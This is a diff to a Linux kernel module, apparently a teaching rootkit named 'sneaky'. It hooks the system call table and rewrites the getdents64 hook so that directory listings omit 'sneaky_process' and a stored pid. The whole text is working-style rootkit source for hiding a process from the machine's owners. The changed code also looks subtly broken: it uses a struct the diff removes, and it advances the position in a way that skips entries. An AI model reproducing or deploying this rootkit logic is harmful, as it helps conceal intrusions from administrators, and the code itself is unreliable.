@@ -14,13 +14,13 @@
 //This is a pointer to the system call table
 static unsigned long *sys_call_table;
 
-struct linux_dirent {
-    unsigned long  d_ino;     /* Inode number */
-    unsigned long  d_off;     /* Offset to next linux_dirent */
-    unsigned short d_reclen;  /* Length of this linux_dirent */
-    char           d_name[];  /* Filename (null-terminated) */
-
-}
+struct linux_dirent64 {
+  ino64_t        d_ino;    /* 64-bit inode number */
+  off64_t        d_off;    /* 64-bit offset to next structure */
+  unsigned short d_reclen; /* Size of this dirent */
+  unsigned char  d_type;   /* File type */
+  char           d_name[]; /* Filename (null-terminated) */
+};
 
 // Helper functions, turn on and off the PTE address protection mode
 // for syscall_table pointer
@@ -52,23 +52,21 @@ asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
   return (*original_openat)(regs);
 }
 
-asmlinkage int (*original_getdents64)(unsigned int, struct linux_dirent64 __user *, unsigned int);
+asmlinkage int (*original_getdents64)(struct pt_regs* regs);
 
-asmlinkage int sneaky_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count) {
-  int original_length = original_getdents64(fd, dirent, count);
+asmlinkage int sneaky_getdents64(struct pt_regs* regs) {
+  int original_length = original_getdents64(regs);
   int position = 0;
-  struct linux_dirent *current;
+  struct linux_dirent * first = (void*)(regs->si);
   int result = 0;
+
   while (position < original_length){
-    current = (void *)dirent + position;
+    struct linux_dirent * current = (void *)first + position;
     char* current_name = current->d_name;
     if (strcmp(current_name, "sneaky_process") == 0 || strcmp(current_name, pid) == 0){
       int current_length = current->d_reclen;
-      if (position + current_length == original_length) {
-        result -= current_length;  
-        break;  
-      }
       memmove((void *)current, (void *)current + current_length, original_length - position - current_length);
+      position += current->d_reclen;
       continue;
     }
     result += current->d_reclen;
